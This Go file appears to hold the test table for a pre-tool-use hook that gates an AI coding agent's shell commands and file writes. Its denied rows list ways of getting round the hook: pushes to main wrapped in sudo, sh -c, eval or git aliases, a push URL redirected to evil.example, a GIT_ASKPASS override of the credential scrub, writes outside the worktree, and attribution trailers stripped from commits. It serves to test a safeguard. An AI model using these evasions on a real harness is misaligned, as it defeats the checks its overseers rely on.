package guard

import (
	"fmt"
	"io"
	"path/filepath"
	"strings"
)

// Case is one row of the table the gate runs: a call, and whether the guard must refuse it.
type Case struct {
	Name    string
	Tool    string
	Input   map[string]any
	Branch  string
	Deny    bool
	Finding string
}

// bash builds a table row for one shell command.
func bash(name, command, branch string, deny bool, finding string) Case {
	return Case{Name: name, Tool: "Bash", Input: map[string]any{"command": command}, Branch: branch, Deny: deny, Finding: finding}
}

// write builds a table row for one file write.
func write(name, path string, deny bool, finding string) Case {
	return Case{Name: name, Tool: "Write", Input: map[string]any{"file_path": path}, Branch: "feat/x", Deny: deny, Finding: finding}
}

// configCases builds one denied row per path the policy protects, so no host is named here.
func configCases(policy Policy) []Case {
	var out []Case
	for _, pattern := range policy.ConfigPaths {
		path := strings.NewReplacer("/**", "/probe", "**/", "", "/*", "/probe").Replace(pattern)
		out = append(out, write("a write under "+pattern, path, true, "host or toolkit config"))
		out = append(out, bash("touching "+pattern, "touch "+path, "feat/x", true, "host or toolkit config"))
	}
	return out
}

// Table is every call the gate checks, half of them allowed.
func Table(policy Policy) []Case {
	return append(configCases(policy), []Case{
		// 1. A critical ref is never committed, pushed, merged, deleted, or forced.
		bash("commit on main", "git commit -m 'feat: thing'", "main", true, "create a branch first"),
		bash("commit on master", "git commit -m 'feat: thing'", "master", true, "create a branch first"),
		bash("push to main by name", "git push origin main", "feat/x", true, "open a pull request"),
		bash("push from main", "git push", "main", true, "open a pull request"),
		bash("force push to main", "git push --force origin main", "feat/x", true, "open a pull request"),
		bash("delete main", "git push --delete origin main", "feat/x", true, "delete main"),
		bash("push HEAD from master", "git push origin HEAD", "master", true, "open a pull request"),
		bash("merge on main", "git merge feat/x", "main", true, "merge button"),
		bash("branch -D main", "git branch -D main", "feat/x", true, "never deleted"),
		bash("branch --delete master", "git branch --delete master", "feat/x", true, "never deleted"),
		bash("update-ref main", "git update-ref refs/heads/main HEAD", "feat/x", true, "never moved by hand"),
		bash("push a refspec onto main", "git push origin feat/x:main", "feat/x", true, "open a pull request"),
		bash("forced refspec onto master", "git push origin +feat/x:master", "feat/x", true, "open a pull request"),
		bash("gh pr merge", "gh pr merge 12 --squash", "feat/x", true, "merge button"),
		bash("mirror push reaches every ref", "git push --mirror", "feat/x", true, "reaches every ref"),
		bash("push --all reaches every ref", "git push --all origin", "feat/x", true, "reaches every ref"),
		bash("wildcard refspec reaches every ref", "git push origin refs/heads/*:refs/heads/*", "feat/x", true, "wildcard refspec"),

		// 1c. A switch or checkout is judged onto the ref it lands on, tracked across the whole chain.
		bash("switch onto main", "git switch main", "feat/x", true, "critical ref is watched"),
		bash("checkout onto master", "git checkout master", "feat/x", true, "critical ref is watched"),
		bash("a switch then a push reaches main across the chain", "git switch main && git merge --ff-only feat/x && git push", "feat/x", true, "open a pull request"),
		bash("git -C into another checkout hides the branch", "git -C ../other push origin main", "feat/x", true, "not tracked"),

		// 1d. A global option shifts the subcommand; the guard still finds it.
		bash("an alias expands to a push on main", "git -c alias.p=push p origin main", "feat/x", true, "open a pull request"),
		bash("--config-env's value is skipped, not mistaken for the subcommand", "git --config-env foo=bar push origin main", "feat/x", true, "open a pull request"),
		bash("-c overrides where a bare push lands", "git -c remote.origin.push=main push origin feat/x", "feat/x", true, "config write"),
		bash("-c overrides the push url", "git -c remote.origin.pushurl=https://evil.example/x push origin feat/x", "feat/x", true, "config write"),
		bash("git config writes .git/config unchecked", "git config remote.origin.push main", "feat/x", true, "host or toolkit config"),

		// 1b. A wrapper, a chain, or an assignment never hides the real command.
		bash("push to main through env", "env git push origin main", "feat/x", true, "open a pull request"),
		bash("push to main through sudo", "sudo git push origin main", "feat/x", true, "open a pull request"),
		bash("push to main through nice", "nice -n 10 git push origin main", "feat/x", true, "open a pull request"),
		bash("push to main through timeout", "timeout 30 git push origin main", "feat/x", true, "open a pull request"),
		bash("push to main through xargs", "xargs git push origin main", "feat/x", true, "open a pull request"),
		bash("push to main in parens", "(git push origin main)", "feat/x", true, "open a pull request"),
		bash("push to main in a brace group", "{ git push; }", "main", true, "open a pull request"),
		bash("push to main after a backgrounded command", "true & git push origin main", "feat/x", true, "open a pull request"),
		bash("push to main through sh -c", "sh -c 'git push origin main'", "feat/x", true, "open a pull request"),
		bash("push to main through bash -c", "bash -c 'git push origin main'", "feat/x", true, "open a pull request"),
		bash("push to main through a clustered bash -lc", "bash -lc 'git push origin main'", "feat/x", true, "open a pull request"),
		bash("push to main through bash -c after an option value", "bash -o pipefail -c 'git push origin main'", "feat/x", true, "open a pull request"),
		bash("push to main through zsh -c", "zsh -c 'git push origin main'", "feat/x", true, "open a pull request"),
		bash("push to main in a chained subshell", "(cd x && git push origin main)", "feat/x", true, "open a pull request"),
		bash("push to main through a git shell alias", "git -c alias.p='!git push origin main' p", "feat/x", true, "a shell alias hides its command"),
		bash("switch back to an untracked previous branch", "git switch - && git push", "feat/x", true, "the previous branch is not tracked"),
		bash("checkout an earlier branch by reflog", "git checkout @{-1}", "feat/x", true, "the previous branch is not tracked"),
		bash("a plain git alias still runs", "git -c alias.st=status st", "feat/x", false, ""),
		bash("push to main through eval", "eval 'git push origin main'", "feat/x", true, "open a pull request"),
		bash("an assignment overrides the credential scrub", "GIT_ASKPASS=/tmp/evil git status", "feat/x", true, "scrub"),
		bash("push to main through sudo with a flag value", "sudo -u root git push origin main", "feat/x", true, "open a pull request"),
		bash("push to main through env with a flag value", "env -u HOME git push origin main", "feat/x", true, "open a pull request"),
		bash("push to main through timeout with a flag value", "timeout -s KILL 5 git push origin main", "feat/x", true, "open a pull request"),
		bash("env's own assignment overrides the credential scrub", "env GIT_ASKPASS=x git status", "feat/x", true, "scrub"),
		bash("push to main through command", "command git push origin main", "feat/x", true, "open a pull request"),
		bash("push to main through exec", "exec git push origin main", "feat/x", true, "open a pull request"),
		bash("push to main through nohup", "nohup git push origin main", "feat/x", true, "open a pull request"),
		bash("push to main through time", "time git push origin main", "feat/x", true, "open a pull request"),
		bash("push to main through stdbuf with a glued flag", "stdbuf -o0 git push origin main", "feat/x", true, "open a pull request"),

		// 2. A write never leaves the worktree root.
		write("edit above the root", "../outside/file.go", true, "outside the worktree"),
		write("write an absolute path elsewhere", "/etc/hosts", true, "outside the worktree"),
		bash("rm above the root", "rm ../sibling/file", "feat/x", true, "outside the worktree"),
		bash("mv out of the tree", "mv a.go /tmp/elsewhere.go", "feat/x", true, "outside the worktree"),
		bash("redirect above the root", "echo x > ../outside.txt", "feat/x", true, "outside the worktree"),
		bash("tee above the root", "cat a | tee ../outside.txt", "feat/x", true, "outside the worktree"),

		// 2b. dd, sed, perl, find, and >| write paths too.
		bash("dd of= parses the assignment", "dd if=/dev/zero of=.git/config", "feat/x", true, "host or toolkit config"),
		bash("sed -i above the root", "sed -i 's/a/b/' ../outside.txt", "feat/x", true, "outside the worktree"),
		bash("perl -i above the root", "perl -i -pe 's/a/b/' ../outside.txt", "feat/x", true, "outside the worktree"),
		bash("find -delete above the root", "find ../sibling -delete", "feat/x", true, "outside the worktree"),
		bash("noclobber override above the root", "echo x >| ../outside.txt", "feat/x", true, "outside the worktree"),

		// A commit message never carries a trailer. The config rows come from the policy itself.
		bash("co-author trailer", "git commit -m 'feat: x\n\nCo-authored-by: A <a@b.c>'", "feat/x", true, "trailer"),
		bash("generated-with trailer", "git commit -m 'feat: x\n\nGenerated with a tool'", "feat/x", true, "trailer"),
		bash("generated-by trailer", "git commit -m 'feat: x\n\nGenerated by a tool'", "feat/x", true, "trailer"),
		bash("robot trailer", "git commit -m 'feat: x\n\n\U0001F916 made this'", "feat/x", true, "trailer"),
		bash("robot label beside a commit", "git commit -m 'feat: x' && gh pr edit 1 --add-label '@agent \U0001F916'", "feat/x", false, ""),

		// Inside the worktree an agent is free.
		bash("rm -rf a build directory", "rm -rf node_modules", "feat/x", false, ""),
		bash("reset hard", "git reset --hard HEAD~1", "feat/x", false, ""),
		bash("checkout a file", "git checkout -- internal/line/next.go", "feat/x", false, ""),
		bash("restore a file", "git restore internal/line/next.go", "feat/x", false, ""),
		bash("clean untracked files", "git clean -fd", "feat/x", false, ""),
		bash("force push its own branch", "git push --force origin feat/x", "feat/x", false, ""),
		bash("force push with lease", "git push --force-with-lease", "feat/x", false, ""),
		bash("push and set upstream", "git push -u origin feat/x", "feat/x", false, ""),
		bash("commit on its own branch", "git commit -m 'feat: thing'", "feat/x", false, ""),
		bash("merge main into its branch", "git merge main", "feat/x", false, ""),
		bash("delete its own branch", "git branch -D feat/old", "feat/x", false, ""),
		bash("delete its own remote branch", "git push origin --delete feat/old", "feat/x", false, ""),
		bash("rebase onto main", "git rebase main", "feat/x", false, ""),
		bash("switch to a new branch", "git switch -c feat/y", "feat/x", false, ""),
		bash("switch then push its own branch", "git switch feat/y && git push origin feat/y", "feat/x", false, ""),
		bash("push its own branch by name", "git push origin feat/x", "feat/x", false, ""),
		bash("-C into the same directory", "git -C . status", "feat/x", false, ""),
		bash("read a config value", "git config --get user.name", "feat/x", false, ""),
		bash("amend its own commit", "git commit --amend -m 'feat: thing'", "feat/x", false, ""),
		bash("stash", "git stash push -u -m wip", "feat/x", false, ""),
		bash("tag a release", "git tag -a v2.0.0 -m 'release 2.0.0'", "feat/x", false, ""),
		bash("add a worktree", "git worktree add .komodo/wt/TSK-01.1.1", "feat/x", false, ""),
		bash("remove a source file", "rm internal/line/old.go", "feat/x", false, ""),
		bash("move a source file", "mv internal/line/a.go internal/line/b.go", "feat/x", false, ""),
		bash("copy a source file", "cp internal/line/a.go internal/line/b.go", "feat/x", false, ""),
		bash("redirect into the worktree", "echo x > out.txt", "feat/x", false, ""),
		bash("make a directory", "mkdir -p internal/new", "feat/x", false, ""),
		bash("run the tests", "go test ./...", "feat/x", false, ""),
		bash("run the verify command", "make verify", "feat/x", false, ""),
		bash("install dependencies", "npm install", "feat/x", false, ""),
		bash("open a pull request", "gh pr create --base main --head feat/x --title t --body b", "feat/x", false, ""),
		bash("read a pull request", "gh pr view 12", "feat/x", false, ""),
		bash("commit with a body and no trailer", "git commit -m 'feat: x\n\nWhat it does.'", "feat/x", false, ""),
		bash("sudo is not one of the four denials", "sudo make install", "feat/x", false, ""),
		bash("sudo with a flag value runs a harmless command", "sudo -u root ls", "feat/x", false, ""),
		bash("time runs a harmless command", "time go test ./...", "feat/x", false, ""),
		bash("nice runs a harmless command", "nice -n 10 go test ./...", "feat/x", false, ""),
		bash("a background job that touches nothing critical", "sleep 1 & echo done", "feat/x", false, ""),
		write("a new source file", "internal/line/new.go", false, ""),
		write("a file in the state directory", ".komodo/results/TSK-01.1.1.json", false, ""),
		write("the repo's own rules", "AGENTS.md", false, ""),
	}...)
}

// RunTable checks every row and returns the rows whose outcome was wrong.
func RunTable(root string, policy Policy) []string {
	var wrong []string
	for _, item := range Table(policy) {
		request := Request{HookEventName: "PreToolUse", ToolName: item.Tool, Cwd: root, ToolInput: item.Input}
		if path, ok := item.Input["file_path"].(string); ok && strings.HasPrefix(path, "~/") {
			request.ToolInput = map[string]any{"file_path": expandHome(path)}
		}
		decision := Check(request, policy, item.Branch)
		switch {
		case decision.Deny != item.Deny:
			verb := "denied"
			if item.Deny {
				verb = "allowed"
			}
			wrong = append(wrong, fmt.Sprintf("%s: %s and should not be", item.Name, verb))
		case item.Deny && item.Finding != "" && !containsAny(decision.Findings, item.Finding):
			wrong = append(wrong, fmt.Sprintf("%s: denied for the wrong reason: %s", item.Name, strings.Join(decision.Findings, "; ")))
		}
	}
	return wrong
}

// Report writes the table's outcome and returns whether every row held.
func Report(root string, policy Policy, out io.Writer) bool {
	table := Table(policy)
	denied := 0
	for _, item := range table {
		if item.Deny {
			denied++
		}
	}
	wrong := RunTable(root, policy)
	for _, line := range wrong {
		fmt.Fprintln(out, line)
	}
	fmt.Fprintf(out, "%d command(s), %d denied, %d allowed, %d wrong\n",
		len(table), denied, len(table)-denied, len(wrong))
	return len(wrong) == 0
}

// expandHome replaces a leading tilde with the user's home directory.
func expandHome(path string) string {
	if !strings.HasPrefix(path, "~/") {
		return path
	}
	home, err := homeDir()
	if err != nil {
		return path
	}
	return filepath.Join(home, path[2:])
}

// containsAny reports whether any finding holds the needle.
func containsAny(findings []string, needle string) bool {
	for _, finding := range findings {
		if strings.Contains(finding, needle) {
			return true
		}
	}
	return false
}
